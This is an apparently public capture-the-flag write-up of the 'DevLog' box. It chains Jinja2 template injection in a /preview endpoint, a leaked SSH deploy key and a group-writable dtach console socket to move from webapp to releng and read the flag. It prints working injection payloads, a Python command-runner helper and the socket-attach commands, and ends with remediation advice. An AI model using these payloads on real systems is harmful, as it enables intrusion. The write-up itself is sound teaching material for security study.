# DevLog — one SSTI field to an ops console running as root's neighbor

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/devlog/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — DevLog's note preview renders user input with
> `render_template_string`, so `{{7*7}}` becomes `49` and a Jinja2 gadget gives
> me RCE as `webapp`. A deploy README hands me an SSH key for `devuser` on an
> internal host. `devuser` is in group `dev`, which can talk to a `dtach` ops
> console socket owned by `releng` — I attach to it, land as `releng`, and read
> the flag. **Flag:** `/home/releng/flag.txt` → `NCTF{41de…}`.

## 1. Briefing

A finale boot2root. The brief only gives me an IP and the hint "journal". One
flag to submit. The fun part: the whole chain is lateral — I never touch root
directly, I just keep hopping to whoever can read the next secret.

| Field | Value |
|-------|-------|
| Target | `10.100.13.101` |
| Reachable port | `8080/tcp` (Flask/gunicorn "DevLog") |
| Flag | `NCTF{...}` |

## 2. Reconnaissance

The first surprise: `nmap -p-` comes back empty. The port is there, the scan
just misses it under the lab's filtering, so I probe directly:

```bash
nmap -p 80,443,8080,8000,3000,5000,4444 -T4 -Pn --open 10.100.13.101
# 8080/tcp open
curl -s http://10.100.13.101:8080/
```

It's a little "DevLog" app with a `/preview` endpoint that renders a note before
you save it. A server-side preview of text I control is exactly where I start
poking at template injection.

## 3. Analysis

I throw the canonical probe at it:

```bash
curl -s http://10.100.13.101:8080/preview -d 'template={{7*7}}'
# ...<pre>49</pre>...
```

`49`, not `{{7*7}}`. So `/preview` runs my input through `render_template_string`
— textbook Jinja2 SSTI. From `49` to a shell is just picking a gadget that walks
from a harmless object up to `os`.

## 4. Exploitation

### Step 1 — SSTI to RCE (as webapp)

```bash
curl -s http://10.100.13.101:8080/preview --data-urlencode \
  "template={{ cycler.__init__.__globals__.os.popen('id').read() }}"
# uid=1000(webapp) gid=1000(webapp)
```

I wrap that in a tiny helper so I can fire any command through the field:

```python
#!/usr/bin/env python3
import sys, re, html, requests
cmd = sys.stdin.read()
tpl = "{{ cycler.__init__.__globals__.os.popen(" + repr(cmd) + ").read() }}"
r = requests.post("http://10.100.13.101:8080/preview", data={"template": tpl}, timeout=30)
m = re.search(r"<pre>(.*?)</pre>", r.text, re.S)
print(html.unescape(html.unescape(m.group(1))) if m else r.text)
```

### Step 2 — webapp → devuser (leaked SSH key)

Poking around `/opt`, the deploy folder is doing my work for me:

```bash
cat /opt/deploy/README.txt          # mentions a host "pivot", account devuser
cat /opt/deploy/notes_sync_ed25519  # a full OpenSSH private key
```

The README says notes are synced to a pivot host as `devuser` with that key. I
grab the key and log in:

```bash
chmod 600 notes_sync_ed25519
ssh -i notes_sync_ed25519 devuser@10.201.17.3   # internal Docker net
```

### Step 3 — devuser → releng (dtach console)

`devuser` isn't sudo-anything, but its groups are interesting:

```bash
id            # ...,3000(dev)
ls -l /run/opsconsole/ops.sock
# srwxrwx--- releng dev  ops.sock
ps auxf | grep dtach
# releng ... dtach -n /run/opsconsole/ops.sock bash
```

So `releng` left an interactive `bash` behind a `dtach` socket, and that socket
is group-`dev` writable — which I am. I attach to it, run my command, and detach
**cleanly** (a plain EOF kills the session, and a keeper respawns it after ~20s,
so I must send Ctrl-\):

```bash
printf 'id; cat /home/releng/flag.txt\n' | \
  script -qec 'dtach -a /run/opsconsole/ops.sock' /tmp/ts.out
# ...then detach with Ctrl-\  (printf '\034')
cat /tmp/ts.out
```

That runs as `releng`, who owns the flag.

## 5. Flag

```text
NCTF{41de…}
```

## 6. Dead ends & troubleshooting

- **`nmap -p-` lies here.** The full scan missed 8080. If a web box looks dead,
  probe known web ports directly (or `/dev/tcp`), don't trust an empty sweep.
- **Killing the dtach session.** My first attach ended with EOF and the session
  died; the session-keeper rebuilt it ~20s later, but I lost my context. Always
  detach with Ctrl-\ (`\034`), never Ctrl-C or EOF.
- **Double HTML-unescape.** The preview escapes output, sometimes twice, so my
  helper unescapes twice before printing — otherwise `&amp;` noise creeps into
  parsed results.

## 7. Lessons & remediation

- **Never render user input as a template.** Use `render_template` with a fixed
  template and pass data as context, or sandbox with a strict environment. A
  preview feature is not a reason to hand users the template engine.
- **Keys don't belong next to their README.** A deploy key readable by the web
  user is a straight pivot. Store it outside the app root, owned by a dedicated
  user, or use short-lived certificates.
- **Group-writable control sockets are shells.** A `dtach`/`tmux` socket that a
  broad group can write to is equivalent to a shell as its owner. Lock the socket
  to a single service account, not a shared `dev` group.

## 8. Appendix — the chain at a glance

```text
SSTI /preview  ──>  webapp (uid 1000)
   └─ /opt/deploy/notes_sync_ed25519  ──>  devuser@10.201.17.3
         └─ group dev + /run/opsconsole/ops.sock  ──>  releng
               └─ /home/releng/flag.txt  ──>  NCTF{41de…}
```
